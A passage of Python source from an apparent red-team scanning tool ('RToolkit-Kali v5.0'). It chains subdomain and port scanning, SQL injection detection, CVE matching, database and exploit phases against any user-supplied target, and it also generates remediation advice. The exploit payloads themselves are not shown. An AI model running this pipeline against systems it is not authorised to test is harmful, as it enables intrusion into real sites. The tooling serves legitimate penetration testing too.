                    flag = " ◀" if d.get("from_recursive") else ""
                    dir_table.append([str(d["status"]), d.get("url","")[:70]+flag, f"{size_kb}KB"])
                    if d not in REPORT["directories"]:
                        REPORT["directories"].append(d)
                print_table(["Status","URL","Size"], dir_table, f"[DIRS FOUND: {len(dirs)}]")
            else:
                print(f"    {c('No accessible paths found',Y)}")
        except:
            pass
        break

# ====== PHASE 3b: ENHANCED SQLI DETECTION (from rtoolkit.py) ======
@timer
def phase3b_sqli_deep(domain, live_urls):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 3b: SQLI — Deteksi SQL injection mendalam',BOLD)}")
    print(f"  {c('  ⤷ Time-based + error-based untuk 5 DB: MySQL, MSSQL, Oracle, PostgreSQL, SQLite',DIM)}")
    print(f"{c('='*65,Y)}")
    for url in live_urls[:3]:
        print(f"\n  {c(f'[+] Scanning: {url}',G)}")
        findings = sqli_detect(url)
        if findings:
            for f2 in findings:
                sev = f2.get("severity","HIGH")
                ftype = f2["type"]
                print(f"    {c(f'[!] {ftype}',R)}")
                print(f"      Param: {f2['param']}")
                print(f"      Payload: {f2.get('payload','N/A')}")
                if "database" in f2: print(f"      DB: {f2['database']}")
                if "response_time" in f2: print(f"      Response: {f2['response_time']}s")
                REPORT["vulnerabilities"].append({"name":f2["type"],"severity":sev,
                    "url":url,"source":"sqli_deep","param":f2.get("param","")})
        else:
            print(f"    {c('No SQLi detected',G)}")
        break

# ====== PHASE 1d: CASCADING SUBDOMAIN SCAN (from rtoolkit.py) ======
@timer
def phase1d_cascade_scan(domain, subdomains):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1d: CASCADE — Scan subdomain satu per satu',BOLD)}")
    print(f"  {c('  ⤷ Cek port + deteksi teknologi di setiap subdomain (max 5)',DIM)}")
    print(f"{c('='*65,Y)}")
    if not subdomains:
        print(f"  {c('No subdomains to cascade',Y)}")
        return
    cascade_results = {}
    for sd in list(subdomains)[:5]:
        try:
            sd_ip = socket.gethostbyname(sd)
        except:
            continue
        print(f"\n  {c(f'[Cascade] Scanning {sd}',G)} ({sd_ip})")
        ports = port_scan(sd_ip)
        if ports:
            cascade_results[sd] = {"ip":sd_ip,"ports":ports}
            print(f"    Ports: {', '.join(str(p) for p in ports[:10])}")
        for proto in ["https","http"]:
            port = 443 if proto == "https" else 80
            try:
                sock = socket.socket(); sock.settimeout(1)
                sock.connect((sd_ip, port)); sock.close()
                url = f"{proto}://{sd}"
                techs = detect_tech_version(url)
                if techs:
                    cves = match_cves_enhanced(techs)
                    print(f"    {c(f'Tech detected: {list(techs.keys())[:4]}',W)}")
                    if cves:
                        for cv in cves:
                            cve_id = cv["cve"]
                            print(f"    {c(f'  CVE: {cve_id}',R)}")
                break
            except:
                pass
    if cascade_results:
        REPORT["cascade"] = cascade_results
        print(f"\n  {c(f'Cascade scan complete: {len(cascade_results)} subs with open ports',G)}")

# ====== REMEDIATION GENERATOR ======
def generate_remediation():
    recs = set()
    for v in REPORT["vulnerabilities"]:
        n = v.get("name","").lower()
        sev = v.get("severity","INFO").upper()
        if "tls" in n or "ssl" in n:
            recs.add("Disable deprecated TLS/SSL protocols, enable only TLS 1.2+")
        if "sqli" in n or "sql injection" in n:
            recs.add("Use parameterized queries / prepared statements for database access")
        if "sensitive file" in n or "waf bypass" in n:
            recs.add("Remove exposed files, restrict access with .htaccess / nginx rules")
        if "xss" in n or "cross-site" in n:
            recs.add("Implement Content-Security-Policy and sanitize all user input")
        if "open port" in n or "port" in n:
            recs.add("Close unnecessary ports, implement firewall rules")
        if "weak" in n:
            recs.add("Update software to latest stable version")
        if "directory listing" in n:
            recs.add("Disable directory listing in web server config")
        if "wp plugin" in n or "wordpress" in n:
            recs.add("Update all WordPress plugins/themes to latest versions")
        if "cve" in n or "cve" in str(v.get("cve","")).lower():
            recs.add("Patch identified CVEs — check vendor security advisories")
    recs.add("Enable HTTP security headers (HSTS, CSP, XCTO, XFO)")
    recs.add("Implement proper authentication and session management")
    if REPORT.get("cves"):
        recs.add(f"Address {len(REPORT['cves'])} matched CVEs by updating affected software")
    return list(recs)[:12]

# v5.0: Confidence-aware remediation
def generate_remediation_v5(conf_src=None):
    """Generate prioritized recommendations. CONFIRMED CVEs get highest priority."""
    recs = []
    cves = REPORT.get("cves", [])
    conf_src = conf_src or REPORT.get("cve_confidence", {})

    # Priority 1: Exploit-available CVEs (highest risk)
    exploit_cves = [c for c in cves if c.get("exploit_available")]
    if exploit_cves:
        recs.append(f"[URGENT] {len(exploit_cves)} CVE(s) have PUBLIC EXPLOITS available: "
                    + ", ".join(c.get("cve","") for c in exploit_cves[:3])
                    + ". Patch immediately or apply compensating controls.")

    # Priority 2: CONFIRMED CVEs
    confirmed = [c for c in cves if c.get("confidence") == "CONFIRMED"]
    if confirmed:
        recs.append(f"[HIGH] {len(confirmed)} CONFIRMED CVE(s) match target software versions: "
                    + ", ".join(c.get("cve","") for c in confirmed[:3])
                    + ". Verify and patch these first.")

    # Priority 3: THEORETICAL plugin CVEs (needs manual verification)
    theoretical = [c for c in cves if c.get("confidence") == "THEORETICAL"]
    if theoretical:
        recs.append(f"[VERIFY] {len(theoretical)} THEORETICAL CVE(s) from plugin names — "
                    "manually verify plugin versions before reporting.")

    # Standard remediation
    for v in REPORT["vulnerabilities"]:
        n = v.get("name","").lower()
        if "sqli" in n or "sql injection" in n:
            recs.append("Use parameterized queries / prepared statements for database access")
        if "sensitive file" in n or "waf bypass" in n:
            recs.append("Remove exposed files; restrict access with .htaccess / nginx rules")
        if "xss" in n or "cross-site" in n:
            recs.append("Implement Content-Security-Policy and sanitize all user input")
        if "tls" in n or "ssl" in n:
            recs.append("Disable deprecated TLS/SSL protocols; enable TLS 1.2+ only")
        if "directory listing" in n:
            recs.append("Disable directory listing in web server config")
        if "wp plugin" in n or "wordpress" in n:
            recs.append("Update all WordPress plugins/themes to latest versions")

    # Default recs
    recs += [
        "Enable HTTP security headers (HSTS, CSP, XCTO, XFO)",
        "Implement proper authentication and session management",
    ]

    # Deduplicate while preserving order
    seen = set()
    unique_recs = []
    for r in recs:
        if r not in seen:
            seen.add(r)
            unique_recs.append(r)
    return unique_recs[:15]

# ====== CLI ARGUMENTS ======
def parse_args():
    import argparse as _ap
    p = _ap.ArgumentParser(prog="rtoolkit-kali.py",
        description="RToolkit-Kali v5.0 — OVERPOWERED RED TEAM TOOL",
        epilog="Example: python rtoolkit-kali.py --target example.com --phase 3,5")
    p.add_argument("-t", "--target", help="Target domain/IP (skip interactive prompt)")
    p.add_argument("-p", "--phase", nargs="+", type=int, default=[],
        help="Run specific phase(s): 1=recon, 2=discovery, 3=vuln, 4=db, 5=exploit, 6=report (default=all)")
    p.add_argument("--quick", action="store_true", help="Skip deep scans (dir bruteforce, cascade, time-based SQLi)")
    p.add_argument("--json", action="store_true", help="Output final report as JSON only (no HTML)")
    p.add_argument("--silent", action="store_true", help="Minimal output (errors only)")
    return p.parse_args() if len(sys.argv) > 1 else _ap.Namespace(target="",phase=[],quick=False,json=False,silent=False)

ARGS = parse_args()

# ====== MAIN PIPELINE ======
def main():
    global ARGS

    if ARGS and ARGS.silent:
        sys.stdout = open(os.devnull, 'w')

    banner()

    # Check environment
    check_tmux()
    check_ssh_keepalive()

    RESULTS_DIR.mkdir(exist_ok=True)

    # v5.0: NVD cache initialization
    global NVD_GLOBAL_CACHE
    NVD_GLOBAL_CACHE = None
    if HAS_NVD and cfg("enable_nvd_live", True):
        cache_days = cfg("nvd_cache_days", 1)
        api_key = cfg("nvd_api_key", "")
        from nvd_client import NvdCache as _NvdCache
        NVD_GLOBAL_CACHE = _NvdCache(api_key=api_key, cache_days=cache_days)
        if NVD_GLOBAL_CACHE.is_stale():
            print(f"  {c('NVD cache stale — will query live API',Y)}")
        else:
            print(f"  {c('NVD cache ready (fresh)',G)}")
        REPORT["nvd_cache_date"] = NVD_GLOBAL_CACHE.meta.get("last_updated", "")
        REPORT["nvd_cache_fresh"] = not NVD_GLOBAL_CACHE.is_stale()
        print(f"  {c('NVD API:',G)} {'✓ enabled' if HAS_NVD else '✗ disabled'} "
              f"| {c('Exploit Check:',G)} {'✓ enabled' if HAS_EXPLOIT_CLIENT else '✗ disabled (install exploitdb)'}")

    # CLI args or interactive
    if ARGS and ARGS.target:
        target = ARGS.target
    else:
        target = input(f"\n  {c('Target (domain or IP)',C)}: ").strip()
    if not target:
        return
    domain = target.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
    REPORT["target"] = domain
    REPORT["timestamp"] = datetime.datetime.now().isoformat()
    print(f"\n  {c('══ PIPELINE SCAN — '+domain+' ══',Y)}")
    print(f"  {c('Config:',DIM)} {config_path}")
    print(f"  {c('Results:',DIM)} {RESULTS_DIR.absolute()}")

    start_global = time.time()

    # Phase selection logic
    phases_to_run = ARGS.phase if ARGS and ARGS.phase else [1,2,3,4,5,6]
    quick = ARGS.quick if ARGS else False

    def should_run(phase_num):
        return phase_num in phases_to_run

    # Phase 1: Recon
    target_ip, tools, all_subs = "", {}, []
    open_ports = []
    live_urls = []

    if should_run(1):
        target_ip, tools, all_subs = run_phase1_concurrent(domain)
        open_ports = port_scan(target_ip) if not tools["nmap"] else []
        phase1_banner_grab(domain, target_ip, open_ports)
        live_urls = phase1_httpx(domain, all_subs, tools)

        # TLS version check
        print(f"\n{c('='*65,Y)}")
        print(f"  {c('PHASE 1e: TLS — Cek versi SSL/TLS yang didukung',BOLD)}")
        print(f"  {c('  ⤷ TLS 1.0/1.1 = usang & tidak aman. Seharusnya hanya TLS 1.2+',DIM)}")
        print(f"{c('='*65,Y)}")
        for targ in [domain, target_ip]:
            try:
                tls = check_tls_versions(targ)
                print_tls_results(tls)
                break
            except:
                continue

        if not quick:
            phase1c_tech_deep(domain, live_urls)
            phase1d_cascade_scan(domain, all_subs)

    # Phase 2: Discovery
    if should_run(2):
        phase2_discovery(live_urls, tools)
        if not quick:
            phase2b_deep_dir_bruteforce(domain, live_urls)

    # Phase 3: Vulnerability
    if should_run(3):
        phase3_vuln_scan(live_urls, tools)
        if not quick:
            phase3b_sqli_deep(domain, live_urls)

    # Phase 4: Database
    if should_run(4):
        phase4_db(domain)

    # Phase 5: Exploit
    if should_run(5):
        phase5_exploit(domain)

    # Phase 6: Report
    if should_run(6):
        phase6_report(domain)

    total_elapsed = int(time.time() - start_global)
    print(f"\n  {c('═'*55,G)}")
    total_vulns = sum(REPORT["summary"].get(k,0) for k in ["critical","high","medium","low"])
    print(f"  {c('✅ SCAN SELESAI!',BOLD)} {c(str(total_elapsed)+' detik',W)}")
    print(f"  {c('📊 Ringkasan:',G)} {c(str(len(REPORT['cves'])),R)} CVE | {c(str(total_vulns),R)} vuln | {c(str(len(REPORT['subdomains'])),W)} subdomain | {c(str(len(REPORT['ports'])),W)} port")
    print(f"  {c('📁 Hasil di:',C)} {RESULTS_DIR}/")
    print(f"  {c('═'*55,G)}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {c('[!] Interrupted',Y)}")
        sys.exit(0)
    except Exception as e:
        print(f"\n  {c('[!] Error: '+str(e),R)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
